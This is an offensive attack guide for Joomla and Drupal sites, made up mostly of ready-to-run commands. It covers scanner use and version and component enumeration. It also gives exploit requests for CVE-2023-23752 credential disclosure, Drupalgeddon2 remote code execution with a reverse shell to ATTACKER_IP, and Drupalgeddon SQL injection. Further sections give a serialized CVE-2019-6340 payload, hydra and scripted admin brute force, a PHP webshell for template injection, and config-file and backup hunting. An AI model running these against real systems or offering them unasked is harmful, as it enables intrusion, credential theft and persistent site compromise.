# Joomla and Drupal CMS Attack Guide

## Introduction

Joomla and Drupal together power millions of websites worldwide, representing the second and third most popular Content Management Systems after WordPress. While both platforms have matured significantly in security, their extensibility through components, modules, and plugins continues to introduce vulnerabilities. This guide covers the complete attack methodology for Joomla (using JoomScan) and Drupal (using Droopescan), including component enumeration, known CVE exploitation paths, configuration file exposure, administrative brute force, and post-exploitation techniques.

Joomla uses a component-based architecture where each URL parameter (`option=com_X`) maps to a specific component with its own attack surface. Drupal employs a render pipeline with hook-based processing that has historically been vulnerable to deserialization and injection attacks. Understanding these architectural differences is critical for effective testing. Both platforms store database credentials in PHP configuration files that are frequently exposed through backup copies.

---

## Part 1: Joomla Exploitation with JoomScan

### Joomla Architecture and Attack Surface

Joomla's architecture centers on components (handling business logic), modules (rendering content blocks), and plugins (intercepting events). The `option=com_X` URL parameter identifies which component processes a request, making component enumeration straightforward. The administrator panel at `/administrator/` controls all site configuration, user management, and extension installation.

Key attack surfaces:
- **Components**: Each installed component may introduce vulnerabilities (SQL injection, RCE, file upload)
- **Configuration file**: `configuration.php` contains database credentials in plaintext PHP variables
- **Administrator panel**: Protected by username/password, vulnerable to brute force
- **Media manager**: File upload functionality that may allow dangerous file types
- **Template editor**: Allows PHP code injection through admin panel access

### JoomScan Comprehensive Scanning

JoomScan (OWASP Joomla Vulnerability Scanner) automates Joomla enumeration and vulnerability detection.

```bash
# Full Joomla scan
joomscan -u http://target --scan-all

# Scan with custom user agent
joomscan -u http://target --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Scan through proxy (Burp Suite)
joomscan -u http://target --proxy http://127.0.0.1:8080

# Scan with authentication cookie
joomscan -u http://target --cookie "session=abc123def456"
```

JoomScan checks for: Joomla version detection, installed components enumeration, directory listing exposure, configuration file backup exposure, known CVEs matching the detected version, debug mode status, and sensitive file access.

### Joomla Version Detection

Identifying the exact Joomla version is critical for CVE mapping. Multiple detection vectors exist:

```bash
# Method 1: XML manifest file
curl -s http://target/administrator/manifests/files/joomla.xml | grep -oP 'version="[^"]*"'

# Method 2: Language file
curl -s http://target/language/en-GB/en-GB.ini | grep -i "version"

# Method 3: README file
curl -s http://target/README.txt | grep -i "joomla"

# Method 4: HTTP headers
curl -sI http://target | grep -i "joomla\|x-powered-by"
```

### Joomla Component Enumeration

Each Joomla component processes requests through `index.php?option=com_COMPONENTNAME`. Probing common components reveals installed functionality and potential attack vectors.

```bash
# Enumerate common Joomla components
for component in users content contact search newsfeeds weblinks media \
  categories tags finder banners redirect messaging login config; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://target/index.php?option=com_$component")
  if [ "$STATUS" = "200" ] || [ "$STATUS" = "500" ]; then
    echo "[FOUND] com_$component (HTTP $STATUS)"
  fi
done

# Check for directory listing in component directories
curl -s http://target/components/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/modules/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/plugins/ | grep -oP 'href="[^/"]+/"'
```

### Joomla Known CVE Exploitation

#### CVE-2023-23752 -- Joomla 4.x Unauthorized Information Disclosure

This critical vulnerability in Joomla 4.0.0 through 4.2.7 allows unauthenticated access to sensitive configuration information through the API endpoint, including database credentials.

```bash
# Exploit CVE-2023-23752
curl -s http://target/api/index.php/v1/config/application?public=true
# Returns JSON with database host, username, password, and other configuration

# Extract database credentials from response
curl -s http://target/api/index.php/v1/config/application?public=true | jq '.data | {dbhost: .dbhost, dbuser: .dbuser, dbpassword: .dbpassword, dbname: .dbname}'
```

#### CVE-2015-8562 -- Joomla HTTP Header Unserialize RCE

Affects Joomla 1.5 through 3.4.5. Exploits PHP object injection through the User-Agent HTTP header, leading to remote code execution.

```bash
# Exploit using public exploit script
python3 joomla_rce_cve20158562.py -t http://target -c "id"
```

### Joomla Administrator Brute Force

Joomla's login form includes CSRF protection via a hidden token, which must be extracted before brute forcing.

```bash
# Automated brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/administrator/index.php:username=^USER^&passwd=^PASS^&task=login&option=com_login:F=Invalid"

# Manual CSRF-aware brute force
for pass in $(cat passwords.txt); do
  CSRF=$(curl -s -c /tmp/jcookies http://target/administrator/ | \
    grep -oP 'name="[a-f0-9]+"\s+value="1"' | head -1 | grep -oP 'name="\K[^"]+')
  RESULT=$(curl -s -b /tmp/jcookies -c /tmp/jcookies -X POST \
    http://target/administrator/index.php \
    -d "username=admin&passwd=$pass&task=login&option=com_login&$CSRF=1" \
    -w "%{redirect_url}" -o /dev/null)
  if echo "$RESULT" | grep -qv "index.php"; then
    echo "[SUCCESS] admin:$pass"
    break
  fi
done
```

### Joomla Post-Exploitation

After gaining administrator access, establish persistence through multiple vectors.

```bash
# Template file editing for webshell injection
# Navigate to: Extensions > Templates > Templates > [Select Template] > Edit index.php
# Inject at end of file: <?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>

# Malicious extension installation
# Create Joomla extension ZIP with webshell in entry point PHP file
# Navigate to: Extensions > Manage > Install > Upload Package File
```

---

## Part 2: Drupal Exploitation with Droopescan

### Drupal Architecture and Attack Surface

Drupal's architecture is built on a hook system where modules register callbacks for specific events. The render pipeline processes arrays through multiple transformation stages, which has historically introduced injection vulnerabilities. Drupal stores configuration in `settings.php` within the `sites/default/` directory, and its database schema supports flexible content types through the entity system.

Key attack surfaces:
- **Render API**: The `#type`, `#markup`, and `#post_render` properties in render arrays have been exploited for RCE
- **REST/JSON:API endpoints**: Expose content, users, and configuration data
- **Configuration export**: `admin/config/development/configuration/export` can expose full site settings
- **PHP Filter module**: Allows arbitrary PHP execution in content (when enabled)
- **Module upload**: Custom modules can contain webshells disguised as legitimate functionality

### Droopescan Drupal Scanning

Droopescan specializes in Drupal (and Joomla/WordPress/Moodle) scanning with version detection, module enumeration, and known vulnerability checks.

```bash
# Basic Drupal scan
droopescan scan drupal -u http://target

# Aggressive scan with all enumerations
droopescan scan drupal -u http://target -t 16 -e a

# Scan with custom headers
droopescan scan drupal -u http://target -U "Mozilla/5.0"

# Scan through proxy
droopescan scan drupal -u http://target --proxy http://127.0.0.1:8080

# Batch scan multiple Drupal targets
droopescan scan drupal -U drupal_targets.txt
```

### Drupal Version Detection

Drupal version identification is the critical first step for CVE mapping. The primary detection method uses `CHANGELOG.txt`, though hardened installations may block access to this file.

```bash
# Primary version detection
curl -s http://target/CHANGELOG.txt | head -5
curl -s http://target/core/CHANGELOG.txt | head -5

# Alternative detection methods
curl -s http://target/core/modules/system/system.info.yml | grep -i version
curl -s http://target/misc/drupal.js | head -3
curl -s http://target/misc/favicon.ico | file -

# Check Drupal generator meta tag
curl -s http://target/ | grep -i "drupal\|generator"

# Check for Drupal-specific HTTP headers
curl -sI http://target | grep -i "x-drupal\|x-generator"
```

### Drupal Module Enumeration

Installed modules extend Drupal's functionality and often introduce vulnerabilities. Enumerate both contributed (third-party) and custom modules.

```bash
# Enumerate modules via directory listing
curl -s http://target/sites/all/modules/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/core/modules/ | grep -oP 'href="[^/"]+/"'

# Enumerate themes
curl -s http://target/sites/all/themes/ | grep -oP 'href="[^/"]+/"'
curl -s http://target/core/themes/ | grep -oP 'href="[^/"]+/"'

# Check for module info files (version detection)
for module in views ctools token pathauto admin_menu devel; do
  curl -s "http://target/sites/all/modules/$module/$module.info" | grep version
  curl -s "http://target/modules/contrib/$module/$module.info.yml" | grep version
done
```

### Drupalgeddon Exploits

#### Drupalgeddon2 -- CVE-2018-7600 (Unauthenticated RCE)

Affects Drupal 7.x and 8.x. Exploits the render API's `#post_render` callback to execute arbitrary commands without authentication. This is one of the most impactful CMS vulnerabilities ever discovered.

```bash
# Drupalgeddon2 exploitation -- system command execution
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=id"

# Using the Ruby exploit script for interactive shell
ruby drupalgeddon2.rb http://target

# Reverse shell via Drupalgeddon2
curl -s http://target -X POST \
  -d "form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&name[#post_render][]=system&name[#type]=markup&name[#markup]=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

#### Drupalgeddon -- CVE-2014-3704 (Drupal 7.x SQL Injection)

Affects Drupal 7.x versions prior to 7.32. Exploits the `expandArguments` function in the database API to inject SQL commands through array-based parameter manipulation.

```bash
# Using the Python exploit script
python3 drupalgeddon.py http://target

# Manual SQL injection via array parameters
curl -s http://target -X POST \
  -d "name[0+AND+1=1;--+]=admin&name[0]=admin&pass=password&form_id=user_login_block"
```

#### CVE-2019-6340 -- Drupal RESTful Web Services RCE

Affects Drupal 8.x with RESTful Web Services module enabled. Exploits field type confusion via REST API endpoints to achieve remote code execution.

```bash
# Test for vulnerability via REST API
curl -s -X POST http://target/node/1?_format=hal_json \
  -H "Content-Type: application/hal+json" \
  -d '{"link":[{"value":"test","options":"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\" GuzzleHttp\\Psr7\\FnStream methods\";a:1:{s:5:\"close\";s:7:\"phpinfo\";}s:9:\"_fn_close\";s:7:\"phpinfo\";}"}]}'
```

### Drupal Administrator Brute Force

Drupal's login form at `/user/login` includes CSRF protection that must be handled during automated testing.

```bash
# Hydra brute force (matches error string "Sorry")
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/user/login:name=^USER^&pass=^PASS^&form_id=user_login&op=Log+in:F=Sorry"

# CSRF-aware manual brute force
for pass in $(cat passwords.txt); do
  # Extract form_build_id (CSRF token)
  CSRF=$(curl -s -c /tmp/dcookies http://target/user/login | \
    grep -oP 'form_build_id" value="\K[^"]+')
  # Attempt login
  RESULT=$(curl -s -b /tmp/dcookies -c /tmp/dcookies -X POST \
    http://target/user/login \
    -d "name=admin&pass=$pass&form_build_id=$CSRF&form_id=user_login&op=Log+in" \
    -w "%{redirect_url}" -o /dev/null)
  if echo "$RESULT" | grep -q "user/1"; then
    echo "[SUCCESS] admin:$pass"
    break
  fi
done
```

### Drupal Post-Exploitation

After gaining administrator access, establish persistence through multiple techniques.

```bash
# Method 1: Enable PHP Filter module (Drupal 7)
# Navigate to: Modules > Enable "PHP Filter"
# Then create content with PHP text format

# Method 2: Install custom malicious module
# Create Drupal module with webshell in .module file
# Upload via: Extend > Install new module

# Method 3: Configuration export for credential harvesting
drush config-export
# Or via web: admin/config/development/configuration/export
# Extract all configuration including database credentials

# Method 4: Database credential extraction
cat sites/default/settings.php | grep -A5 "'database'\|'username'\|'password'\|'host'"
```

---

## Cross-Platform Configuration File Hunting

Both Joomla and Drupal store database credentials in PHP configuration files. A systematic approach to finding exposed configuration files often yields direct database access without requiring any exploit.

```bash
# Joomla configuration file hunting
curl -s http://target/configuration.php
for ext in bak old save swp "~" tmp copy orig; do
  curl -s -o /dev/null -w "%{http_code}" "http://target/configuration.php.$ext"
done

# Drupal configuration file hunting
curl -s http://target/sites/default/settings.php
for ext in bak old save swp "~" tmp copy orig; do
  curl -s -o /dev/null -w "%{http_code}" "http://target/sites/default/settings.php.$ext"
done

# Generic backup file discovery
for file in backup.sql db.sql database.sql dump.sql site.tar.gz backup.zip; do
  curl -s -o /dev/null -w "%{http_code}" "http://target/$file"
done
```

---

## References

- [OWASP JoomScan GitHub](https://github.com/OWASP/joomscan) -- official Joomla vulnerability scanner
- [Droopescan GitHub](https://github.com/droope/droopescan) -- Drupal and CMS vulnerability scanner
- [CVE-2018-7600 Drupalgeddon2 Analysis](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/) -- detailed technical analysis
- [CVE-2014-3704 Drupalgeddon Analysis](https://www.drupal.org/SA-CORE-2014-005) -- official security advisory
- [Joomla Security Checklist](https://docs.joomla.org/Security_Checklist) -- Joomla hardening guide
- [Drupal Security Team Advisories](https://www.drupal.org/security) -- official Drupal security advisories
- [Exploit-DB Joomla Exploits](https://www.exploit-db.com/search?q=joomla) -- searchable Joomla exploit database
- [Exploit-DB Drupal Exploits](https://www.exploit-db.com/search?q=drupal) -- searchable Drupal exploit database
- [Joomla Documentation: Security](https://docs.joomla.org/Security) -- official Joomla security documentation
- [Drupal Hardening Guide](https://www.drupal.org/docs/security-in-drupal) -- Drupal security best practices
